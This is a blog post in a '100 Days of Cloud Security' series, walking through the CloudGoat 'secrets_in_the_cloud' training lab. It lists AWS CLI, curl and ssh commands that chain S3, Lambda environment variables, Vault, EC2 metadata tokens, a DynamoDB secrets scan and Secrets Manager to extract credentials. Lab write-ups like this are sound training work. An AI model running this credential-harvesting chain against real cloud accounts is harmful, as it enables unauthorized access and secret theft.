---
title: '100 Days of Cloud Security - Day 34: Cloud Security Journey'
date: '2025-12-13'
author: 'Venkata Pathuri'
excerpt: 'Day 34 of my cloud security journey - Cloud Security Journey'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 34: Cloud Security Journey

## Overview
Welcome back to our cloud security journey! As we dive into Day 34, we’re building on the foundational skills we honed in Day 33, where we explored IAM roles and policies. Today, we will tackle a real-world scenario involving secrets management in the cloud. We’ll deploy the `secrets_in_the_cloud` scenario using CloudGoat, gaining hands-on experience with AWS services that are crucial for managing sensitive data securely.

## Learning Objectives
By the end of today's session, you will master the art of deploying a cloud security scenario that involves multiple AWS services, including Lambda, S3, DynamoDB, and Secrets Manager. You will learn how to enumerate resources, extract sensitive information, and understand the implications of misconfigured permissions in cloud environments. This practical experience will empower you to identify and mitigate vulnerabilities in your own cloud applications.

## Deep Dive
Today’s scenario revolves around extracting secrets from AWS Secrets Manager through a series of interconnected services. Here’s how we’ll approach it.

### Initial Enumeration
First, we need to confirm our identity as a low-privileged user. By running the command:

```bash
aws sts get-caller-identity --profile cg
```

You will see output confirming your IAM user and account, which is essential for verifying access rights in your AWS environment. 

### Exploring S3 Buckets
Next, we’ll check the S3 buckets accessible to our user. The command:

```bash
aws s3 ls --profile cg
```

will list the available buckets. Upon discovering the relevant bucket, you can download files, such as:

```bash
aws s3 cp s3://cg-secrets-bucket-cgidu4llq7ypeg/nates_web_app_url.txt ./url.txt --profile cg
```

This file may contain crucial URLs leading to further data retrieval points, like an application using Vault for secrets management.

### Investigating Lambda Functions
We will then list Lambda functions using:

```bash
aws lambda list-functions --profile cg
```

This reveals environment variables, potentially exposing sensitive keys. For instance, an API key discovered can be used to access admin endpoints, which is a common vulnerability in misconfigured Lambda functions.

### Accessing the Vault
Once we have the API key, we can access the Vault UI, typically running on port 8200. After logging in with the retrieved credentials, you'll find sensitive data, including SSH keys necessary for accessing other resources.

### Enumerating EC2 Metadata (IMDSv2)
To interact with EC2 instances, we will exploit the Instance Metadata Service (IMDSv2). Start by fetching a token:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 3600")
```

Using this token, you can retrieve the IAM role associated with the EC2 instance, which can grant further access to resources like DynamoDB.

### Exploring DynamoDB
Next, we’ll list DynamoDB tables:

```bash
aws dynamodb list-tables --region us-east-1
```

and scan the secrets table for sensitive data:

```bash
aws dynamodb scan --table-name secrets-table-cgidu4llq7ypeg --region us-east-1
```

This reveals access keys and secrets, which can then be validated against AWS services.

### Accessing Secrets Manager
Finally, we validate these credentials and access Secrets Manager:

```bash
aws secretsmanager list-secrets --profile secrets-manager --region us-east-1
```

and retrieve the secret value using:

```bash
aws secretsmanager get-secret-value \
--secret-id arn:aws:secretsmanager:us-east-1:997581282912:secret:cg-secret-cgidu4llq7ypeg-wOE5iO \
--profile secrets-manager --region us-east-1
```

This process culminates in successfully extracting sensitive information, showcasing the risks of mismanaged secrets in cloud environments.

## Hands-On Practice
To replicate this scenario, follow these steps:

1. Confirm your identity: 
   ```bash
   aws sts get-caller-identity --profile cg
   ```

2. List available S3 buckets:
   ```bash
   aws s3 ls --profile cg
   ```

3. Download files from S3:
   ```bash
   aws s3 cp s3://cg-secrets-bucket-cgidu4llq7ypeg/nates_web_app_url.txt ./url.txt --profile cg
   ```

4. List Lambda functions:
   ```bash
   aws lambda list-functions --profile cg
   ```

5. Access Vault and retrieve SSH keys, then SSH into the EC2 instance:
   ```bash
   ssh -i id_rsa ec2-user@98.87.168.68
   ```

6. Fetch EC2 metadata:
   ```bash
   TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 3600")
   curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info
   ```

7. List and scan DynamoDB tables:
   ```bash
   aws dynamodb list-tables --region us-east-1
   aws dynamodb scan --table-name secrets-table-cgidu4llq7ypeg --region us-east-1
   ```

8. Validate and access Secrets Manager:
   ```bash
   aws sts get-caller-identity --profile secrets-manager
   aws secretsmanager list-secrets --profile secrets-manager --region us-east-1
   ```

## Key Takeaways
Today, you learned how interconnected AWS services can expose vulnerabilities if not secured properly. By following the path from S3 to Lambda, Vault, EC2, DynamoDB, and finally to Secrets Manager, we demonstrated the importance of access management and the need for robust security practices in the cloud.

## Real-World Applications
In actual production environments, understanding how to manage secrets securely is vital. Misconfigured permissions can lead to unauthorized access to sensitive data, resulting in data breaches. Implementing strict IAM policies, utilizing tools like AWS Secrets Manager for managing sensitive information, and regularly auditing cloud resources are best practices that safeguard against such risks.

---
**Journey Progress:** 34/100 Days Complete 🚀